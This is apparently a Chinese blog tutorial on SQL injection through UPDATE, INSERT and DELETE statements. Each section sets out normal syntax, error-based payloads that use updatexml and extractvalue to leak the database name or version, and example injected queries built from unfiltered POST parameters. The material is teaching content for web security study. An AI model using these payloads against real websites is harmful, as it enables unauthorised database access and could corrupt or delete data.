# 原创
：  【SQL注入】UPDATE、insert、delete注入

# 【SQL注入】UPDATE、insert、delete注入

**目录**

[一、简介：](#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A)

[二、UPDATE注入](#%E4%BA%8C%E3%80%81UPDATE%E6%B3%A8%E5%85%A5)

[简介：](#%E7%AE%80%E4%BB%8B%EF%BC%9A)

[2.1、语法：](#2.1%E3%80%81%E8%AF%AD%E6%B3%95%EF%BC%9A)

[2.2、利用：](#2.2%E3%80%81%E5%88%A9%E7%94%A8%EF%BC%9A)

[payload:](#payload%3A)

[示例：](#%E7%A4%BA%E4%BE%8B%EF%BC%9A)

[三、insert注入](#%E4%B8%89%E3%80%81insert%E6%B3%A8%E5%85%A5)

[简介：](#%E7%AE%80%E4%BB%8B%EF%BC%9A)

[3.1、语法：](#3.1%E3%80%81%E8%AF%AD%E6%B3%95%EF%BC%9A)

[3.2、利用：](#3.2%E3%80%81%E5%88%A9%E7%94%A8%EF%BC%9A)

[payload:](#payload%3A)

[示例：](#%E7%A4%BA%E4%BE%8B%EF%BC%9A)

[四、delete注入](#%E5%9B%9B%E3%80%81delete%E6%B3%A8%E5%85%A5)

[简介：](#%E7%AE%80%E4%BB%8B%EF%BC%9A)

[4.1、语法：](#4.1%E3%80%81%E8%AF%AD%E6%B3%95%EF%BC%9A)

[4.2、利用：](#4.2%E3%80%81%E5%88%A9%E7%94%A8%EF%BC%9A)

[payload:](#payload%3A)

[示例：](#%E7%A4%BA%E4%BE%8B%EF%BC%9A)

---


---


> 
<h2>一、简介：</h2>
与数据库交互的请求都有可能造成SQL注入。常见的注入都是select的查询注入比较多，但是SQL注入在参数没有检查和过滤的时候就会把恶意的数据插入数据库，如：插入数据，更改数据，删除数据等
但是相对于插入，更改，删除权限，普通用户查询权限一定是有的


---


---


## 二、UPDATE注入

> 
<h3>简介：</h3>
1、UPDATE语句用于修改表中的一行或几行数据。它们经常在用户修改已有数据值的功能中，例如， 更新个人信息、修改密码或更改订单数据
2、典型UPDATE语句的运行机制与INSERT语句类似， 只是UPDATE语句中通常包含一个WHERE子句， 告诉数据库更新表中哪些行的数据


> 
<h3>2.1、语法：</h3>
更新某一列
UPDATE table SET column=new_value WHERE column= value
更新若干列
UPDATE table SET column1=new_value1, column2=new_value2 WHEREcolumn= value


> 
<h3>2.2、利用：</h3>
<h4>payload:</h4>
aaaa' or updatexml(1, concat(0x7e, database()),0) or '（字符型）
' or extractvalue(1,concat(0x5e24,(database()))) or '（数字型）
<hr/>
<h4>示例：</h4>
update table set column='' or updatexml(1,concat(0x7e,(database())),0) or '',password='$_POST['password']' where id=$_POST['id']


#### 示例：

---


---


## 三、insert注入

> 
<h3>简介：</h3>
在表中建立一个新的数据行


> 
<h3>3.1、语法：</h3>
插入数据
insert into table(column1, column2, column3) value (value 1, value 2, value 3)


> 
<h3>3.2、利用：</h3>
<h4>payload:</h4>
' or updatexml(1,concat(0x7e,(database())),0) or '（字符型）
' or extractvalue(1,concat(0x5e24,(database()))) or '（数字型）
<hr/>
<h4>示例：</h4>
insert into user(username,password) values('' or updatexml(1,concat(0x7e,(database())),0) or '','$_POST['password']')


#### 示例：

---


---


## 四、delete注入

> 
<h3>简介：</h3>
用于删除一行或几行数据，与UPDATE语句一样． DELETE语句通常使用WHERE子句告诉数据库更新表中哪些行的数据并很可能在这个子句中并入用户提交的数据。破坏正常运行的WHERE子句可能会造成严顶的后果， 我们在UPDATE语句部分提出的警告同样还用于这种攻击


> 
<h3>4.1、语法：</h3>
删除表中指定数据
delete from table where id=$id


> 
<h3>4.2、利用：</h3>
<h4>payload:</h4>
or or updatexml(1,concat(0x7e,(database())),0) or ' '
or extractvalue(1,concat(0x5e24,(database()))) or ' '
'or（有效载荷）or'<br/> 'and（有效载荷）and'<br/> 'or（有效载荷）and'
'or（有效载荷）and'='
'*（有效载荷）*'
'or（有效载荷）and'
" - （有效载荷） - "
<hr/>
<h4>示例：</h4>
delete注入时使用 or 一定要为false,为ture就被执行，没有报错回显了
delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0)


#### 示例：
